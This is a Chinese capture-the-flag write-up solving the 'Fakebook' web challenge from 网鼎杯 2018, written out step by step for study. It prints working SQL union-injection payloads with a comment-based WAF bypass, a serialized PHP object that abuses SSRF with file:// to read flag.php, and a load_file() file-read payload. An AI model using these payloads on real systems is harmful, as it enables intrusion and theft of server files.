# [网鼎杯 2018]Fakebook  
TAG:PHP SSRF 布尔型盲注 
## 解题过程  
### 预期解  
fakebook捏它了facebook，尝试注册看一下会有什么效果  
![20210127103004](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127103004.png)  
![20210127103400](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127103400.png)  
这时在列表中出现了注册的用户  
![20210127103500](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127103500.png)  
点击详情页面可以发现序列化值  
```data:text/html;base64,PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT4zMDEgTW92ZWQgUGVybWFuZW50bHk8L3RpdGxlPgo8L2hlYWQ+PGJvZHk+CjxoMT5Nb3ZlZCBQZXJtYW5lbnRseTwvaDE+CjxwPlRoZSBkb2N1bWVudCBoYXMgbW92ZWQgPGEgaHJlZj0iaHR0cHM6Ly9tcnpoYW5nNzYuY29tLyI+aGVyZTwvYT4uPC9wPgo8aHI+CjxhZGRyZXNzPkFwYWNoZS8yLjQuMjkgKFVidW50dSkgU2VydmVyIGF0IG1yemhhbmc3Ni5jb20gUG9ydCA4MDwvYWRkcmVzcz4KPC9ib2R5PjwvaHRtbD4K```  

![20210127103604](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127103604.png)  
解码后发现为用户输入的目标网页代码，怀疑存在SSRF漏洞  
![20210127110444](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127110444.png)  
想要利用SSRF漏洞获取到flag，需要知道页面如何处理用户注册的输入      
使用目录扫描工具发现存在```robots.txt```文件，并存在```uesr.php.bak```备份文件泄露  
![20210127125146](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127125146.png)  
![20210127120503](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127120503.png)
```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```  
通过阅读代码可知，用户可将序列化字符串传递给页面，页面反序列化后放入```iframe```标签中，形成SSRF攻击  
存在flag.php页面，初步确定flag位置  
![20210127162238](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127162238.png)  
使用php伪协议file读取flag.php
```
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";
}
$a = new UserInfo();
$a->name = 'mrzhang76';
$a->age = 18;
$a->blog = 'file:///var/www/html/flag.php';
echo serialize($a);
?>
```
秩序化后值:  
```
O:8:"UserInfo":3:{s:4:"name";s:8:"admin888";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/user.php";}
```  
但是没法让想要的内容插入到iframe标签中，如果有报错注入的话就可以尝试进行信息的嵌套了  
```view.php```存在get参数，通过手工测试发现存在报错注入，使用联合查询尝试镶嵌信息  
![20210127161023](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127161023.png)  
联合查询被过滤，尝试进行WAF的逃逸  
![20210127170925](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210127170925.png)  
经测试，可以使用```select/**/union```进行WAF绕过  
```/view.php?no=-1 union/**/select 1,database(),3,4--+```  
![20210128222904](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210128222904.png)  
根据报错信息可知，在字段4处需要传入序列化字符串才能被正确解析，为此构造payload：
```
/view.php?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:9:"mrzhang76";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'--+
```
  
![20210128230624](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210128230624.png)  
查看页面源代码，点击链接就能获得flag  
 
### 非预期解    
页面处理SQL语句时并未过滤敏感函数，可以直接使用load_file()函数进行文件的读取  
payload:```/view.php?no=0 union/**/select 1,load_file('/var/www/html/flag.php'),3,4```  
![20210129120125](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210129120125.png)  
## 题目分析 